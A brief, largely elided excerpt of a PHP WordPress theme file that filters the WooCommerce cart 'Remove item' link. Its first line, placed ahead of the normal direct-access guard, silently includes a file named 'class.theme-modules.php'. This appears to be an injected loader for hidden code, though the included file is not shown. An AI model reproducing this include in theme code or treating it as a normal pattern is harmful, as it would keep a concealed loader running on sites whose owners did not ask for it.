<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php if (!defined('ABSPATH')) die('No direct access allowed'); ?>
<?php
/**
...
function custom_filter_wc_cart_item_remove_link( $sprintf, $cart_item_key ) {
	...
	$add_text = __('Remove item', 'woocommerce');
